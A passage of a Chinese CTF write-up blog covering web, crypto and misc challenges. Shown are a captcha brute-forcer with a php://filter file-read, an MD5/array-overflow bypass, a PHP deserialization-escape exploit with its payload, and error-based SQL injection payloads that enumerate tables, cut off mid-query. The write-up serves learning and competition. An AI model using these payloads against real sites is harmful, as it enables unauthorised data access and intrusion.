class="built_in">print</span>(ver[<span class="number">0</span>][<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">data = &#123;<span class="string">&quot;authcode&quot;</span>:ver[<span class="number">0</span>][<span class="number">0</span>:<span class="number">4</span>],<span class="string">&quot;guess&quot;</span>:<span class="string">&quot;on&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    r2 = ks.post(url+<span class="string">&quot;/index.php&quot;</span>,data=data)</span><br><span class="line">    ver = re.findall(<span class="string">&#x27;pic\/(.*?)\.jpg&#x27;</span>,r2.text)</span><br><span class="line">    data = &#123;<span class="string">&quot;authcode&quot;</span>:ver[<span class="number">0</span>][<span class="number">0</span>:<span class="number">4</span>],<span class="string">&quot;guess&quot;</span>:<span class="string">&quot;on&quot;</span>&#125;</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(r2.text))</span><br><span class="line">    <span class="comment">#3319为验证码出错时返回消息长度，正常情况应为3287</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(r2.text)&gt;<span class="number">3287</span>):</span><br><span class="line">        <span class="built_in">print</span>(r2.text)</span><br><span class="line">        r3 = ks.get(url+<span class="string">&quot;/index.php?file=php://filter/read=convert.base64-encode/resource=rander.php&quot;</span>) <span class="comment">#读取源码</span></span><br><span class="line">        <span class="built_in">print</span>(r3.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>源码得到为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// create object</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;num&#x27;</span>] &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">&#x27;smarty/Smarty.class.php&#x27;</span>);</span><br><span class="line">	<span class="variable">$smarty</span> = <span class="keyword">new</span> Smarty;</span><br><span class="line">	<span class="variable">$name</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">	<span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;string:恭喜 &#x27;</span>.<span class="variable">$name</span>.<span class="string">&#x27; 获得了胜利&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>存在模板注入。<del>烦死</del>。<br>总之通过用户名进行注入。</p>
<hr>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><hr>
<h3 id="中国古代加密"><a href="#中国古代加密" class="headerlink" title="中国古代加密"></a>中国古代加密</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">古有乾隆晓岚对出千古绝句：</span><br><span class="line"></span><br><span class="line">花甲重逢，增加三七岁月。古稀双庆，更多一度春秋。</span><br><span class="line">今有诗人徐海源于东电题诗：</span><br><span class="line"></span><br><span class="line">群芳无力懒梳妆，楚楚金花吐暗香。 不愿游人夸颜色，千紫万红续华章。</span><br><span class="line">题于己亥年三月初十，名为迎春花。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">留一密文：千愁万绪</span><br><span class="line"></span><br><span class="line">该对使得flag有头有尾，该诗使得flag有声有调，可谓形同：“不到园林怎知春色如许，不入书塾何闻书声朗朗。”</span><br><span class="line"></span><br><span class="line">hint1:诗词分上下两部分，flag比较长，数字和关键信息的出现位置有关。</span><br><span class="line">hint2:结合加粗的文字提示和加密方式，排列组合，可以得到Neepu&#123;纯数字&#125;，然后尝试提交吧！</span><br></pre></td></tr></table></figure>
<p>通过搜索得到需要用到古诗的加密，得到戚继光发明的反切法，通过第一首诗的声母和第二首诗的韵母凑成的密码表。<br>外加最后给了密码表，其实flag已经呼之欲出了（<del>没出是因为我脑子被门夹了</del>）。<br>有头有尾，这个对子我背了好多年了，就是有个老人141岁，所以乾隆和纪晓岚一个出上对一个接下对，都是指老人的年龄，于是头尾都是141。<br>接着有声有调把我迷惑了，大概是指这个诗使得flag有声母也有韵母，也就是第三个提示写的密码表，取上四句诗的声母和下四句的韵母。<br>（但我猜到141作为头尾之前加了声调，猜到后就没加，导致没出，个人感觉题出的有问题，但没出就是白干，呜呜呜），于是对照表得出三个一组共四组的数据代表每个字，但有些韵母对应多个数字，因为提示flag较长，因此有两位数的就去两位数，都是一位数的就一一尝试。<br>最终得到flag:<code>Neepu&#123;141181832310414124141&#125;</code></p>
<h1 id="newctf"><a href="#newctf" class="headerlink" title="newctf"></a>newctf</h1><h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>php部分</p>
<figure class="highlight php"><figcaption><span>&#123; .theme-legacy&#125;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">            <span class="variable">$six_number</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;webp&#x27;</span>];</span><br><span class="line">            <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">            <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">            <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$six_number</span>) == <span class="string">&#x27;e10adc3949ba59abbe56e057f20f883e&#x27;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>) &amp;&amp; <span class="variable">$a</span> !== <span class="variable">$b</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$array</span>[++<span class="variable">$c</span>]=<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$array</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span class="line">        <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>即使是弱对比，如果不是<code>0e</code>开头的，也无法通过科学计数法去绕，毕竟md5硬要对比是比不出的，可以尝试MD5在线解密，其实并非解密，而是可以查常见的一些MD5值，于是通过MD5在线解密得到这个MD5值对应的字符串应该是<code>123456</code>，接着利用MD5函数漏洞用去绕过这个对比，下面的是给array赋值，如果赋值失败就会返回false，就能绕过，于是传入<code>9223372036854775806</code>，这个值就是PHP的array创建数组的最大值，通过<code>++$c</code>的运算后导致接着赋值出错，绕过，但得到的并非flag而是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">你觉得就这么简单吗？？？，可以告诉你密码哦！</span><br><span class="line">password: xluoyyds123456@@@ </span><br></pre></td></tr></table></figure>
<p>这个密码不知道用在哪里，传了一下password值，但并没有回显，看一看题目描述，这张图真好看，没啥隐藏的东西吧，那么就说明图里面很可能藏了个压缩包  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">    background-image: url(backImg.jpg);</span><br><span class="line">    background-size: contain;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>于是通过foremost分离出一个zip压缩包，然后解压，密码就是它给的，得到文本文件，拿到flag。这里感谢<span class="exturl" data-url="aHR0cHM6Ly9sdWNpZmVyLXJvc3N3ZWlzc2UuZ2l0aHViLmlvLw==">@Rossweisse</span>师傅<br>顺便贴一下foremost的一个教程：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY25ubm5ubi9wLzg5OTQzNjIuaHRtbA==">链接</span></p>
<h3 id="weblog"><a href="#weblog" class="headerlink" title="weblog"></a>weblog</h3><h4 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a>反序列化逃逸</h4><figure class="highlight php"><figcaption><span>&#123; .theme-legacy &#125;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logFile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$initMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$exitMsg</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// initialise variables</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;initMsg=<span class="string">&quot;#--session started--#\n&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;exitMsg=<span class="string">&quot;#--session end--#\n&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logFile =  <span class="variable">$file</span>;</span><br><span class="line">        <span class="title function_ invoke__">readfile</span>(<span class="variable language_">$this</span>-&gt;logFile);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fd</span>=<span class="title function_ invoke__">fopen</span>(<span class="variable language_">$this</span>-&gt;logFile,<span class="string">&quot;a+&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fd</span>,<span class="variable">$msg</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&#x27;flag&#123;xxxxxxxx&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weblogfile</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// self::waf($this-&gt;filepath);</span></span><br><span class="line">        <span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">B</span>(<span class="variable language_">$this</span>-&gt;weblogfile);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$str</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weblogfile</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logFile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$initMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$exitMsg</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_serialized</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/:\d*?:&quot;/&#x27;</span>,<span class="variable">$data</span>,<span class="variable">$m</span>,PREG_OFFSET_CAPTURE);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$r</span>)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$m</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$v</span>[<span class="number">1</span>])+<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>[<span class="number">0</span>])+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$v</span>[<span class="number">0</span>],<span class="number">1</span>));</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="variable">$a</span>] !== <span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">                 <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_string</span>(<span class="variable">$data</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&#x27;N;&#x27;</span> === <span class="variable">$data</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([adObis]):/&#x27;</span>,<span class="variable">$data</span>,<span class="variable">$badions</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$badions</span>[<span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>( <span class="string">&quot;/^<span class="subst">&#123;$badions[1]&#125;</span>:[0-9]+:.*[;&#125;]\$/s&quot;</span>, <span class="variable">$data</span> ) )</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^<span class="subst">&#123;$badions[1]&#125;</span>:[0-9.E-]+;\$/&quot;</span>, <span class="variable">$data</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$log</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;log&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_serialized</span>(<span class="variable">$log</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;no1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$log1</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/A/&quot;</span>,<span class="string">&quot;C&quot;</span>,<span class="variable">$log</span>);</span><br><span class="line"><span class="variable">$log2</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/B/&quot;</span>,<span class="string">&quot;D&quot;</span>,<span class="variable">$log1</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">unserialize</span>(<span class="variable">$log2</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;no2&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$log</span>);</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$log</span>);</span><br><span class="line"><span class="variable">$log_unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这道题应该是经过了三重过滤：<br>首先通过自定义过滤函数<code>is_serialized</code>检测传入的字符串是否为正确的序列化字符串。<br>接着会将字符串中的A类名和B类名替换为C和D作为检测该序列化字符串是否能正常进行反序列化。<br>最后将一些字符和字符串flag替换为空，然后进行反序列化。<br>终于明白了（<del>wp出来了</del>）<br>构造反序列化逃逸，首先要了解一点序列化字符串的反序列化过程<br>先给出exp和payload：</p>
<figure class="highlight php"><figcaption><span>&#123; .theme-legacy &#125;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&#x27;flagflagflagflagflagflag&lt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weblogfile</span>=<span class="string">&#x27;;s:10:&quot;weblogfile&quot;;s:&lt;8:&quot;flflagag.php&quot;;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> A;</span><br><span class="line">    <span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">得到payload:</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">25</span>:<span class="string">&quot;flagflagflagflagflagflag&lt;&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;weblogfile&quot;</span>;s:<span class="number">40</span>:<span class="string">&quot;;s:10:&quot;</span>weblogfile<span class="string">&quot;;s:&lt;8:&quot;</span>flflagag.php<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">25</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;weblogfile&quot;</span>;s:<span class="number">40</span>:<span class="string">&quot;;s:10:&quot;</span>weblogfile<span class="string">&quot;;s:8:&quot;</span>flag.php<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>上面一条是payload，下面一条是按题目中过滤后得到的，两条字符串都是可以正常进行反序列化的<br>从<code>O</code>开始，<code>1</code>，表示有一个类，也就是<code>A</code>，这个类里有两个属性，读到一个属性长度为4，也就是<code>file</code>,它的值为长度是25的字符串，于是从冒号开始找25个字符串作为<code>file</code>的值，接着通过<code>&quot;</code>闭合，同理，第二个属性<code>weblogfile</code>的值为长度是40的字符串，最后冒号闭合掉这个长度为40的字符串，最后找到<code>&#125;</code>闭合掉这个序列化字符串。</p>
<p>接着看到第二个被过滤后的字符串，按照上面讲的规则，仍然是可以正常闭合的，因为为第二个属性找到长度为8的字符串并闭合后，接着找到<code>&#125;</code>作为序列化字符串的闭合后，最终后面多余的部分<code>&quot;;&#125;</code>就作废了，并不会抛出报错。<br>payload中的<code>&lt;</code>和<code>flag</code>都是作为凑长度或者绕过而加上的。<br><code>:&lt;8:</code>是用于绕过 </p>
<figure class="highlight php"><figcaption><span>&#123; .theme-legacy &#125;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>( <span class="string">&quot;/^<span class="subst">&#123;$badions[1]&#125;</span>:[0-9]+:.*[;&#125;]\$/s&quot;</span>, <span class="variable">$data</span> ) )</span><br></pre></td></tr></table></figure>
<p>构造反序列化逃逸时必须保证经过过滤后的最终的序列化字符串仍然符合反序列化的规则。一但闭合出错就会导致抛出错误从而无法正确反序列化。</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>NTQ1NjcwNTg1MjMwNGU2MTRkN2E0ZTUwNTQ2YzU2NTg1NDdhNGU1NDRlMzAzNTQ3NTc0NTU5MzI0ZTQ2NTI0YjU0NTQ1NjU2NTM0NTZiMzM1MzU0MzAzZA&#x3D;&#x3D;  </p>
<p>base64特征<br>base64后<br>5456705852304e614d7a4e50546c5658547a4e544e303547574559324e46524b5454565653456b335354303d </p>
<p>16进制特征<br>16进制转字符串后<br>TVpXR0NaMzNPTlVXTzNTN05GWEY2NFRKTTVVSEk3ST0&#x3D;  </p>
<p>base32和base64特征<br>base64之后<br>MZWGCZ33ONUWO3S7NFXF64TJM5UHI7I&#x3D;  </p>
<p>base32和base64特征<br>base32之后<br>flag{sign_in_right}</p>
<h1 id="国赛"><a href="#国赛" class="headerlink" title="国赛"></a>国赛</h1><h2 id="一卷"><a href="#一卷" class="headerlink" title="一卷"></a>一卷</h2><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>注入，输入<code>1&#39;#</code>，发现报错信息是后面有<code>&#39;)</code>，是单引号和括号闭合，然后查看字段数，查出是2，但联合注入查询的时候发现<code>union</code>被过滤了，接着用报错注入，用户名填：<code>1&#39;)and extractvalue(1,(&#39;~&#39;,database()))#</code>，密码部分一直不填，查到数据库是<code>security</code>，但进一步想查表名的时候却发现information又被过滤了<br>只好使用内连接查询，得先试出个表名，一般来说这种有登录界面的都有个叫<code>users</code>的表，于是尝试<br><code>1&#39;)and extractvalue(1,concat(&#39;~&#39;,(select group_concat(a) from users)))#</code><br>报错<code>Unknown column &#39;a&#39; in &#39;field list&#39;</code><br>那么它真的就有这个表，那users表的标配字段名就是id，果然查到了，于是内连接查询:<br><code>1&#39;)and extractvalue(1,concat(&#39;~&#39;,(select * from(select * from users a inner join (select * from users)b using(id))c)))#</code><br>查到有<code>username</code>，再如法炮制，<code>1&#39;)and extractvalue(1,concat(&#39;~&#39;,(select * from(select * from users a inner join (select * from users)b using(id,username))c)))#</code>，得到还有<code>password</code>，再查询这些字段内的东西，结果都不是flag<br>于是合理猜测有一个叫flag的表，一查还真就有<br>那…通过对比两个表，看看有没有相同字段，<code>1&#39;)and extractvalue(1,concat(&#39;~&#39;,(select * from(select * from users a inner join (select * from flag)b 